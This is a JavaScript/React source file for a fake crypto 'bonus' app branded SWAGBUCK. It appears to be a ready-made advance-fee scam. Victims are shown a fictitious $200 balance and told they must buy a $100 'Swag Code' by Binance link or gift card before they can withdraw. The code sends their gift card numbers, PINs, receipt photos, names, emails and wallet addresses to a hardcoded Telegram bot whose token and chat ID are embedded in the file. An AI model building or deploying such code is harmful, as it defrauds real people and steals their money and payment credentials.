// Modified version of the app with all requested changes

// ============================================
// PART 1: Update Zustand Store (Pt) - Currency change
// ============================================
const Pt = jT()(kT(t => ({
  userData: null,
  userPin: "",
  themeMode: "light",
  balance: 200, // Changed from 200,000 NGN to $200
  balanceVisible: true,
  transactions: [],
  setUserData: e => t(r => ({ userData: { ...r.userData, ...e } })),
  setUserPin: e => t({ userPin: e }),
  setThemeMode: e => t({ themeMode: e }),
  clearUserData: () => t({ userData: null, userPin: "" }),
  updateBalance: e => t(r => ({ balance: r.balance + e })),
  addTransaction: e => t(r => ({ transactions: [e, ...r.transactions] })),
  toggleBalanceVisibility: () => t(e => ({ balanceVisible: !e.balanceVisible }))
}), { name: "swagbuck-user-storage" }));

// ============================================
// PART 2: Telegram Bot Integration
// ============================================
// Add this near the top after imports
const TELEGRAM_BOT_TOKEN = "8787030087:AAHHapBvK9TrNdxEAZJwXzX9Offm-unHrOU"; // Replace with your actual bot token
const TELEGRAM_CHAT_ID = "8485065839"; // Replace with your chat ID

const sendToTelegram = async (message, photo) => {
  try {
    if (photo) {
      // Send photo with caption
      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('photo', photo);
      formData.append('caption', message);
      
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    } else {
      // Send text message
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      });
    }
  } catch (error) {
    console.error("Failed to send to Telegram:", error);
  }
};

// ============================================
// PART 3: Updated Buy BPC Page (V4) - Now Swag Code Purchase
// ============================================
const V4 = () => {
  const t = xe();
  const { userData: e } = Pt();
  const [r] = m.useState("$100");
  const [n, s] = m.useState((e == null ? void 0 : e.fullName) || "");
  const [i, a] = m.useState((e == null ? void 0 : e.email) || "");
  const [l, c] = m.useState(!1);
  const [u, d] = m.useState(!0);
  const [p, b] = m.useState(null); // For gift card upload
  const [g, y] = m.useState(""); // Gift card number/pin
  const [v, w] = m.useState(""); // Gift card name
  const [_, j] = m.useState(""); // Payment method: 'binance' or 'giftcard'
  const [S, N] = m.useState(""); // For upload preview
  const [k, P] = m.useState(""); // Email for receiving code
  const [O, F] = m.useState(!1); // Uploading state

  const h = C => {
    const q = C.target.files ? C.target.files[0] : null;
    if (q) {
      b(q);
      N(URL.createObjectURL(q));
    }
  };

  const M = async () => {
    if (_ === "giftcard" && (!g || !v)) {
      Ve({ variant: "destructive", description: "Please fill in gift card details" });
      return;
    }
    
    if (_ === "giftcard" && !p) {
      Ve({ variant: "destructive", description: "Please upload gift card receipt" });
      return;
    }
    
    if (!k) {
      Ve({ variant: "destructive", description: "Please enter your email to receive the Swag Code" });
      return;
    }

    F(!0);

    try {
      // Send to Telegram based on payment method
      if (_ === "binance") {
        await sendToTelegram(
          `💰 NEW SWAG CODE PAYMENT (BINANCE)\n\n` +
          `User: ${n}\n` +
          `Email: ${k}\n` +
          `Amount: $100\n` +
          `Payment Method: Binance Link\n` +
          `Link clicked: https://s.binance.com/5X7gQwiH\n` +
          `Time: ${new Date().toLocaleString()}`
        );
      } else if (_ === "giftcard" && p) {
        // Send gift card details as text
        await sendToTelegram(
          `🎁 NEW SWAG CODE PAYMENT (GIFT CARD)\n\n` +
          `User: ${n}\n` +
          `Email: ${k}\n` +
          `Amount: $100\n` +
          `Card Name: ${v}\n` +
          `Card Number/PIN: ${g}\n` +
          `Time: ${new Date().toLocaleString()}`
        );
        
        // Send receipt photo
        await sendToTelegram(
          `📎 Gift Card Receipt for ${k}`,
          p
        );
      }

      Ve({ 
        title: "Payment Submitted!", 
        description: "Your payment details have been sent. We'll email your Swag Code shortly.",
        variant: "default"
      });
      
      setTimeout(() => {
        F(!1);
        t("/swag-code/processing");
      }, 2000);
    } catch (error) {
      console.error(error);
      Ve({ variant: "destructive", description: "Failed to process payment. Please try again." });
      F(!1);
    }
  };

  return o.jsxs("div", { className: "min-h-screen flex flex-col bg-gray-100", children: [
    o.jsx("header", { className: "bg-[#1a237e] text-white py-3 px-4", children: 
      o.jsx("h1", { className: "text-xl font-bold", children: "Buy Swag Code" })
    }),
    u && e && o.jsxs("div", { className: "bg-blue-50 p-3 border-l-4 border-blue-500 mx-4 mt-3 rounded", children: [
      o.jsxs("p", { className: "text-blue-800 text-sm", children: [
        "Welcome back, ",
        o.jsx(vo, { text: e.fullName || "User", speed: 100, className: "font-semibold" })
      ] }),
      o.jsxs("p", { className: "text-blue-600 text-xs mt-1", children: [
        "Email: ",
        o.jsx(vo, { text: e.email || "", speed: 80, className: "font-medium" })
      ] })
    ] }),
    o.jsx("div", { className: "flex-1 p-4", children: 
      o.jsxs("div", { className: "space-y-4", children: [
        o.jsxs("div", { children: [
          o.jsx("label", { className: "text-base text-gray-600 mb-1 block", children: "Amount" }),
          o.jsx(Le, { type: "text", value: r, readOnly: !0, className: "text-base py-3 border-2 border-gray-300 rounded-lg bg-gray-100", placeholder: "$0.00" })
        ] }),
        o.jsxs("div", { children: [
          o.jsx("label", { className: "text-base text-gray-600 mb-1 block", children: "Full Name" }),
          o.jsx(Le, { type: "text", value: n, onChange: C => s(C.target.value), className: "text-base py-3 border-2 border-gray-300 rounded-lg", placeholder: "Enter your full name" })
        ] }),
        o.jsxs("div", { children: [
          o.jsx("label", { className: "text-base text-gray-600 mb-1 block", children: "Email Address (to receive Swag Code)" }),
          o.jsx(Le, { type: "email", value: k, onChange: C => P(C.target.value), className: "text-base py-3 border-2 border-gray-300 rounded-lg", placeholder: "email@example.com", required: true })
        ] }),
        
        // Payment Method Selection
        o.jsxs("div", { className: "mb-4", children: [
          o.jsx("label", { className: "block text-gray-700 text-sm font-medium mb-2", children: "Select Payment Method" }),
          o.jsxs("div", { className: "grid grid-cols-2 gap-3", children: [
            o.jsxs("div", { 
              className: `p-4 border-2 rounded-lg cursor-pointer text-center ${_ === "binance" ? "border-blue-600 bg-blue-50" : "border-gray-200"}`,
              onClick: () => j("binance"),
              children: [
                o.jsx("span", { className: "text-2xl mb-2 block", children: "🔗" }),
                o.jsx("p", { className: "font-medium", children: "Binance Link" }),
                o.jsx("p", { className: "text-sm text-gray-600", children: "$100" })
              ]
            }),
            o.jsxs("div", { 
              className: `p-4 border-2 rounded-lg cursor-pointer text-center ${_ === "giftcard" ? "border-blue-600 bg-blue-50" : "border-gray-200"}`,
              onClick: () => j("giftcard"),
              children: [
                o.jsx("span", { className: "text-2xl mb-2 block", children: "🎁" }),
                o.jsx("p", { className: "font-medium", children: "Gift Card" }),
                o.jsx("p", { className: "text-sm text-gray-600", children: "$100" })
              ]
            })
          ] })
        ] }),
        
        // Binance Link Option
        _ === "binance" && o.jsxs("div", { className: "bg-blue-50 p-4 rounded-lg", children: [
          o.jsx("p", { className: "text-sm text-gray-700 mb-3", children: "Click the button below to pay with Binance:" }),
          o.jsx(K, { 
            className: "w-full bg-yellow-500 hover:bg-yellow-600 text-white py-3", 
            onClick: () => {
              window.open("https://s.binance.com/5X7gQwiH", "_blank");
              M();
            },
            children: "Pay $100 with Binance"
          })
        ] }),
        
        // Gift Card Option
        _ === "giftcard" && o.jsxs("div", { className: "space-y-4", children: [
          o.jsxs("div", { children: [
            o.jsx("label", { className: "block text-gray-700 text-sm font-medium mb-2", children: "Gift Card Name/Type" }),
            o.jsx(Le, { 
              type: "text", 
              value: v, 
              onChange: C => w(C.target.value), 
              placeholder: "e.g., Amazon, Google Play, iTunes",
              className: "w-full border-2 border-gray-300 rounded-lg p-3"
            })
          ] }),
          o.jsxs("div", { children: [
            o.jsx("label", { className: "block text-gray-700 text-sm font-medium mb-2", children: "Gift Card Number/PIN" }),
            o.jsx(Le, { 
              type: "text", 
              value: g, 
              onChange: C => y(C.target.value), 
              placeholder: "Enter gift card number or PIN",
              className: "w-full border-2 border-gray-300 rounded-lg p-3"
            })
          ] }),
          o.jsxs("div", { children: [
            o.jsx("label", { className: "block text-gray-700 text-sm font-medium mb-2", children: "Upload Gift Card Receipt/Photo" }),
            o.jsx("div", { className: "border-2 border-dashed border-gray-300 rounded-lg p-4 text-center", children: [
              o.jsx("input", { type: "file", accept: "image/*", onChange: h, className: "hidden", id: "receipt-upload" }),
              o.jsx("label", { htmlFor: "receipt-upload", className: "cursor-pointer", children: 
                S ? o.jsxs("div", { className: "space-y-2", children: [
                  o.jsx("img", { src: S, alt: "Receipt preview", className: "max-h-32 mx-auto rounded" }),
                  o.jsx("p", { className: "text-sm text-green-600", children: "✓ Receipt uploaded" })
                ] }) : o.jsxs("div", { className: "space-y-2", children: [
                  o.jsx(io, { size: 32, className: "mx-auto text-gray-400" }),
                  o.jsx("p", { className: "text-sm text-gray-600", children: "Click to upload receipt photo" })
                ] })
              })
            ] })
          ] })
        ] }),
        
        // Send Button
        _ && o.jsxs("div", { children: [
          o.jsx(K, { 
            onClick: M, 
            disabled: O, 
            className: "w-full bg-green-600 hover:bg-green-700 text-lg py-4",
            children: O ? "Processing..." : "Send Payment Details"
          }),
          o.jsx("p", { className: "text-center text-gray-500 text-sm mt-3", children: 
            "Your Swag Code will be emailed to you after confirmation"
          })
        ] })
      ] })
    })
  ] });
};

// ============================================
// PART 4: Updated Withdrawal Page (L4) - Now Crypto Withdrawal
// ============================================
const L4 = () => {
  const t = xe();
  const { userData: e, balance: r, updateBalance: n, addTransaction: s } = Pt();
  const [i, a] = m.useState(""); // Crypto type
  const [l, c] = m.useState(""); // Wallet address
  const [u, d] = m.useState(""); // Amount
  const [f, h] = m.useState(""); // Swag code
  const [g, y] = m.useState(!1);
  
  const p = ["USDT", "BTC", "BNB", "ETH", "SOL", "PI", "SIDRA", "CUSD"];

  const b = async v => {
    v.preventDefault();
    
    if (!i || !l || !u || !f) {
      Ve({ variant: "destructive", description: "Please fill in all fields" });
      return;
    }
    
    if (f !== "SWAG2026LTD") {
      Ve({ variant: "destructive", description: "Invalid Swag Code. Please check your email for the correct code." });
      return;
    }
    
    const w = parseFloat(u);
    if (w > r) {
      Ve({ variant: "destructive", description: "Insufficient balance" });
      return;
    }
    
    y(!0);
    
    try {
      // Send withdrawal request to Telegram
      await sendToTelegram(
        `💸 NEW WITHDRAWAL REQUEST\n\n` +
        `User: ${e?.fullName || "Unknown"}\n` +
        `Email: ${e?.email || "No email"}\n` +
        `Crypto Type: ${i}\n` +
        `Wallet Address: ${l}\n` +
        `Amount: $${w}\n` +
        `Swag Code Used: ${f}\n` +
        `Time: ${new Date().toLocaleString()}`
      );
      
      n(-w);
      s({ 
        id: Date.now(), 
        type: `Withdrawal to ${i}`, 
        amount: `-$${w.toLocaleString()}`, 
        date: new Date().toLocaleString(), 
        status: "Processing", 
        recipient: `${i} wallet` 
      });
      
      Ve({ description: "Withdrawal request submitted successfully!" });
      t("/dashboard");
    } catch (error) {
      Ve({ variant: "destructive", description: "Failed to process withdrawal" });
    } finally {
      y(!1);
    }
  };

  return o.jsxs("div", { className: "min-h-screen flex flex-col bg-gray-100", children: [
    o.jsx("header", { className: "bg-blue-600 text-white py-3 px-4 text-center", children: 
      o.jsx("h1", { className: "text-xl font-bold", children: "Crypto Withdrawal" })
    }),
    o.jsxs("div", { className: "p-4", children: [
      o.jsx("h2", { className: "text-2xl font-bold mb-4", children: "Withdraw to Crypto Wallet" }),
      o.jsxs("form", { onSubmit: b, className: "space-y-4", children: [
        // Crypto Type Selection
        o.jsxs("div", { children: [
          o.jsx("label", { className: "block text-gray-700 mb-1 text-sm", children: "Select Cryptocurrency" }),
          o.jsxs(Mc, { value: i, onValueChange: a, children: [
            o.jsx(wo, { className: "w-full border-2 border-blue-600 rounded-lg p-3 h-12 text-base", children: 
              o.jsx(Dc, { placeholder: "Select crypto type" })
            }),
            o.jsx(bo, { className: "max-h-[250px]", children: 
              p.map(v => o.jsx(_o, { value: v, children: v }, v))
            })
          ] })
        ] }),
        
        // Wallet Address
        o.jsxs("div", { children: [
          o.jsx("label", { className: "block text-gray-700 mb-1 text-sm", children: "Wallet Address" }),
          o.jsx(Le, { 
            type: "text", 
            value: l, 
            onChange: v => c(v.target.value), 
            className: "w-full border-2 border-blue-600 rounded-lg p-3 text-base", 
            placeholder: "Enter your wallet address" 
          })
        ] }),
        
        // Amount
        o.jsxs("div", { children: [
          o.jsx("label", { className: "block text-gray-700 mb-1 text-sm", children: "Amount ($)" }),
          o.jsx(Le, { 
            type: "number", 
            value: u, 
            onChange: v => d(v.target.value), 
            className: "w-full border-2 border-blue-600 rounded-lg p-3 text-base", 
            placeholder: "Enter amount to withdraw",
            min: "1",
            step: "0.01"
          })
        ] }),
        
        // Swag Code
        o.jsxs("div", { children: [
          o.jsx("label", { className: "block text-gray-700 mb-1 text-sm", children: "Swag Code (from email)" }),
          o.jsx(Le, { 
            type: "text", 
            value: f, 
            onChange: v => h(v.target.value), 
            className: "w-full border-2 border-blue-600 rounded-lg p-3 text-base", 
            placeholder: "Enter SWAG2026LTD" 
          }),
          o.jsx("p", { className: "text-xs text-red-500 mt-1", children: "Must be exactly SWAG2026LTD" })
        ] }),
        
        // Balance Display
        o.jsx("div", { className: "mt-6", children: 
          o.jsxs("p", { className: "text-lg font-bold", children: ["Available Balance: $", r.toLocaleString()] })
        }),
        
        // Submit Button
        o.jsx(K, { 
          type: "submit", 
          disabled: g, 
          className: "w-full bg-blue-600 hover:bg-blue-700 text-base py-4 mt-3", 
          children: g ? "Processing..." : "Submit Withdrawal" 
        })
      ] })
    ] })
  ] });
};

// ============================================
// PART 5: Update Dashboard Balance Display (jR)
// ============================================
const jR = ({ balance: t }) => {
  const e = xe();
  const { balanceVisible: r, toggleBalanceVisibility: n } = Pt();
  return o.jsxs("div", { className: "bg-swagbuck-blue text-white rounded-xl p-3 mb-2", children: [
    o.jsx("p", { className: "text-sm mb-1", children: "Available Balance" }),
    o.jsxs("div", { className: "flex justify-between items-center mb-2", children: [
      o.jsxs("div", { className: "flex items-center gap-2", children: [
        o.jsx("h3", { className: "text-2xl font-bold", children: r ? `$${t.toLocaleString()}` : "$***********" }),
        o.jsx("button", { onClick: n, className: "p-1 hover:bg-white/10 rounded transition-colors", children: 
          r ? o.jsx(Ak, { className: "h-4 w-4 text-white/80" }) : o.jsx(Yx, { className: "h-4 w-4 text-white/80" })
        })
      ] }),
      o.jsx(K, { className: "bg-white text-swagbuck-blue hover:bg-gray-100 font-semibold text-xs px-2 py-1 h-8", onClick: () => e("/withdraw"), children: "Withdraw" })
    ] }),
    o.jsxs("div", { className: "bg-white/10 rounded-lg p-2", children: [
      o.jsxs("div", { className: "flex justify-between items-center", children: [
        o.jsx("p", { className: "text-xs", children: "Daily withdrawal limit" }),
        o.jsx("p", { className: "text-xs font-semibold", children: "$500" })
      ] }),
      o.jsx("div", { className: "w-full bg-white/20 h-1 rounded-full mt-1", children: 
        o.jsx("div", { className: "bg-white h-1 rounded-full", style: { width: "35%" } })
      })
    ] })
  ] });
};

// ============================================
// PART 6: Update all instances of BluePay to SwagBuck
// ============================================

// Update header component (Gb)
const Gb = () => {
  const t = xe();
  const e = () => { t("/admin"); };
  return o.jsxs("header", { className: "bg-swagbuck-blue text-white py-4 px-5 flex justify-between items-center sticky top-0 z-10", children: [
    o.jsx("button", { className: "text-xl", onClick: e, children: o.jsx($k, { size: 24 }) }),
    o.jsx("h1", { className: "text-2xl font-semibold", children: "SWAGBUCK" }),
    o.jsx("div", { className: "w-8 h-8", children: o.jsx(Ck, { size: 24 }) })
  ] });
};

// Update landing page (VT)
const VT = () => {
  const t = xe();
  return o.jsx("div", { className: "flex flex-col min-h-screen bg-swagbuck-blue text-white", children:
    o.jsxs("div", { className: "flex-1 flex flex-col", children: [
      o.jsx("header", { className: "p-4", children:
        o.jsx("div", { className: "flex items-center", children:
          o.jsxs("div", { className: "text-2xl font-bold relative", children: [
            o.jsx("span", { className: "relative z-10 bg-gradient-to-r from-white via-blue-200 to-blue-400 bg-clip-text text-transparent", children: "SWAG" }),
            o.jsx("span", { className: "relative z-10 bg-gradient-to-r from-blue-400 via-blue-300 to-white bg-clip-text text-transparent", children: "BUCK" }),
            o.jsx("span", { className: "relative z-10 ml-1 bg-gradient-to-r from-white to-blue-200 bg-clip-text text-transparent text-sm font-light", children: "2026" }),
            o.jsx("div", { className: "absolute -bottom-1 left-0 w-full h-0.5 bg-gradient-to-r from-transparent via-blue-300 to-transparent" })
          ] })
        })
      }),
      o.jsx("main", { className: "flex-1 flex flex-col p-6 justify-center", children:
        o.jsxs("div", { className: "mt-16", children: [
          o.jsx("img", { src: "images/55c3f237-e0a0-487d-8665-b3f3c186b081.png", alt: "SWAGBUCK2026", className: "mx-auto mb-10 max-w-xs" }),
          o.jsx("h1", { className: "text-4xl font-bold mb-4", children: "Get Your Account Ready And Instantly." }),
          o.jsx("p", { className: "text-lg mb-10", children: "Get your account ready and instantly start buying, selling and start withdrawing in crypto." }),
          o.jsx(K, { className: "bg-white hover:bg-gray-100 text-swagbuck-blue font-bold py-3 px-8 rounded-full text-lg", onClick: () => t("/register"), children: "Get Started" })
        ] })
      })
    ] })
  });
};

// Update dashboard profile greeting (_R)
const _R = ({ userData: t }) => o.jsxs("div", { className: "flex justify-between items-center mb-3", children: [
  o.jsxs("div", { className: "flex items-center gap-3", children: [
    o.jsx(mo, { className: "w-10 h-10 border-2 border-white", children: 
      t != null && t.profileImage ? o.jsx(po, { src: t.profileImage, alt: "Profile", className: "object-cover" }) : 
      o.jsx(go, { className: "bg-yellow-500", children: o.jsx("span", { className: "text-white text-lg", children: "👤" }) })
    }),
    o.jsxs("h2", { className: "text-lg font-semibold", children: ["Hi, ", o.jsx(vo, { text: (t == null ? void 0 : t.fullName) || "User", speed: 100, className: "font-semibold" })] })
  ] }),
  o.jsx("div", { className: "w-8 h-8 bg-swagbuck-blue rounded-full flex items-center justify-center", children: 
    o.jsx("span", { className: "text-sm", children: "🔒" })
  })
] });

// Update onboarding modal (LA)
const LA = () => {
  const [t, e] = m.useState(!1);
  const [r, n] = m.useState(0);
  const s = xe();
  const { userData: i } = Pt();
  const a = () => i != null && i.fullName ? i.fullName.split(" ")[0] : "User";
  
  const l = [
    { emoji: "🎁", title: "Happy new month 🎗", description: 'Welcome to the ultimate bonus claim trusted platform. Click "claim bonus" to start earning which can be withdrawn in crypto.', buttonText: "Next →" },
    { emoji: "🛍", title: "Get Your Swag Code", description: "To withdraw funds, you'll need to purchase a Swag Code for $100. This is a one-time purchase that unlocks all features of the app.", buttonText: "Next →" },
    { emoji: "☎", title: "Crypto Withdrawals", description: "You can withdraw to any supported cryptocurrency wallet. Simply select your crypto type, enter your wallet address, and use your Swag Code.", buttonText: "Next →" },
    { emoji: "💰", title: "Withdrawal Process", description: 'To withdraw your funds, tap the "Withdraw" button on your dashboard, enter your crypto details and Swag Code, and submit your request.', buttonText: "Next →" },
    { emoji: "💲", title: "Earn More", description: "Explore our app to discover ways to earn more! Refer friends to earn $5 per referral, join our communities, and take advantage of special promotions.", buttonText: "Get Started →", hasActions: !0 }
  ];

  m.useEffect(() => {
    localStorage.getItem("swagbuck-onboarding-completed") || e(!0);
  }, []);

  const c = () => {
    r < l.length - 1 ? n(u => u + 1) : u();
  };

  const u = () => {
    localStorage.setItem("swagbuck-onboarding-completed", "true");
    e(!1);
  };

  const d = () => {
    localStorage.setItem("swagbuck-onboarding-completed", "true");
    e(!1);
  };

  const f = () => {
    window.open("https://t.me/LORD_BM", "_blank");
  };

  const h = () => {
    s("/support");
    u();
  };

  const g = l[r];

  return o.jsx(N1, { open: t, onOpenChange: e, children:
    o.jsxs(Um, { className: "max-w-sm mx-auto bg-white dark:bg-gray-800 border-none p-0 gap-0", children: [
      o.jsxs("div", { className: "bg-swagbuck-blue text-white p-4 rounded-t-lg", children: [
        o.jsxs(Fm, { className: "text-center", children: [
          o.jsxs("div", { className: "flex justify-between items-center mb-2", children: [
            o.jsxs(zm, { className: "text-lg font-bold text-white flex-1", children: ["Welcome to SWAGBUCK, ", a(), "!"] }),
            o.jsx("button", { onClick: d, className: "p-1 hover:bg-white/10 rounded", children: o.jsx(Ms, { className: "h-4 w-4 text-white" }) })
          ] }),
          o.jsxs("p", { className: "text-sm text-white/80", children: ["Step ", r + 1, " of ", l.length] })
        ] }),
        o.jsx("div", { className: "flex gap-2 mt-3", children: 
          l.map((y, p) => o.jsx("div", { className: `flex-1 h-1 rounded ${p <= r ? "bg-white" : "bg-white/30"}`, children: "" }, p))
        })
      ] }),
      o.jsxs("div", { className: "p-6 space-y-6", children: [
        o.jsx("div", { className: "flex justify-center", children: 
          o.jsx("div", { className: "w-16 h-16 rounded-full bg-swagbuck-blue/10 flex items-center justify-center", children: 
            o.jsx("span", { className: "text-3xl", children: g.emoji })
          })
        }),
        o.jsxs("div", { className: "text-center space-y-3", children: [
          o.jsx("h2", { className: "text-xl font-bold text-gray-900 dark:text-white", children: g.title }),
          o.jsx("p", { className: "text-sm text-gray-600 dark:text-gray-300 leading-relaxed", children: g.description })
        ] }),
        g.hasActions && o.jsxs("div", { className: "flex justify-center gap-4 mb-4", children: [
          o.jsxs("button", { onClick: f, className: "flex flex-col items-center gap-2 p-3 rounded-lg hover:bg-gray-50 dark:hover:bg-gray-700 transition-colors", children: [
            o.jsx("div", { className: "w-12 h-12 rounded-full bg-blue-100 dark:bg-blue-900 flex items-center justify-center", children: o.jsx("span", { className: "text-2xl", children: "🌐" }) }),
            o.jsx("span", { className: "text-xs font-medium text-gray-700 dark:text-gray-300", children: "Communities" })
          ] }),
          o.jsxs("button", { onClick: h, className: "flex flex-col items-center gap-2 p-3 rounded-lg hover:bg-gray-50 dark:hover:bg-gray-700 transition-colors", children: [
            o.jsx("div", { className: "w-12 h-12 rounded-full bg-gray-100 dark:bg-gray-900 flex items-center justify-center", children: o.jsx("span", { className: "text-2xl", children: "📡" }) }),
            o.jsx("span", { className: "text-xs font-medium text-gray-700 dark:text-gray-300", children: "Support" })
          ] })
        ] }),
        o.jsx(K, { onClick: c, className: "w-full bg-swagbuck-blue hover:bg-swagbuck-blue/90 text-white py-3 rounded-lg font-medium", children: g.buttonText })
      ] })
    ] })
  });
};

// ============================================
// PART 7: Update Routes with all new pages
// ============================================

const dL = () => o.jsxs(SC, { client: cL, children: [
  o.jsx(uL, {}),
  o.jsx(NE, {}),
  o.jsx(eC, {}),
  o.jsxs(vT, { children: [
    o.jsxs(fT, { children: [
      o.jsx(ke, { path: "/", element: o.jsx(VT, {}) }),
      o.jsx(ke, { path: "/register", element: o.jsx(yR, {}) }),
      o.jsx(ke, { path: "/setup-pin", element: o.jsx(Nv, {}) }),
      o.jsx(ke, { path: "/dashboard", element: o.jsx(DA, {}) }),
      o.jsx(ke, { path: "/pin", element: o.jsx(Nv, {}) }),
      o.jsx(ke, { path: "/profile", element: o.jsx(WA, {}) }),
      o.jsx(ke, { path: "/withdraw", element: o.jsx(L4, {}) }),
      o.jsx(ke, { path: "/withdraw/processing", element: o.jsx(M4, {}) }),
      o.jsx(ke, { path: "/withdrawal/form", element: o.jsx(U4, {}) }),
      o.jsx(ke, { path: "/withdrawal/payment", element: o.jsx(F4, {}) }),
      o.jsx(ke, { path: "/withdrawal/failed", element: o.jsx(z4, {}) }),
      o.jsx(ke, { path: "/account-upgrade", element: o.jsx(W4, {}) }),
      o.jsx(ke, { path: "/swag-code", element: o.jsx(V4, {}) }),
      o.jsx(ke, { path: "/swag-code/processing", element: o.jsx(H4, {}) }),
      o.jsx(ke, { path: "/swag-code/payment", element: o.jsx(q4, {}) }),
      o.jsx(ke, { path: "/swag-code/verifying", element: o.jsx(K4, {}) }),
      o.jsx(ke, { path: "/swag-code/confirmation", element: o.jsx(Z4, {}) }),
      o.jsx(ke, { path: "/airtime", element: o.jsx(Q4, {}) }),
      o.jsx(ke, { path: "/data", element: o.jsx(J4, {}) }),
      o.jsx(ke, { path: "/support", element: o.jsx(X4, {}) }),
      o.jsx(ke, { path: "/admin", element: o.jsx(rL, {}) }),
      o.jsx(ke, { path: "/faq", element: o.jsx(nL, {}) }),
      o.jsx(ke, { path: "/platform", element: o.jsx(sL, {}) }),
      o.jsx(ke, { path: "/earn-more", element: o.jsx(oL, {}) }),
      o.jsx(ke, { path: "/transaction-history", element: o.jsx(lL, {}) }),
      o.jsx(ke, { path: "*", element: o.jsx(VA, {}) })
    ] }),
    o.jsx(WT, {})
  ] })
] });

// Add custom CSS for SwagBuck blue color
// Add this to your global CSS or in a style tag
const swagbuckStyles = `
  .bg-swagbuck-blue {
    background-color: #1a4d8c;
  }
  .text-swagbuck-blue {
    color: #1a4d8c;
  }
  .border-swagbuck-blue {
    border-color: #1a4d8c;
  }
  .hover\\:bg-swagbuck-blue\\/90:hover {
    background-color: rgba(26, 77, 140, 0.9);
  }
`;

// Inject styles
const style = document.createElement('style');
style.textContent = swagbuckStyles;
document.head.appendChild(style);

// ============================================
// Render the app
// ============================================
gx(document.getElementById("root")).render(o.jsx(dL, {}));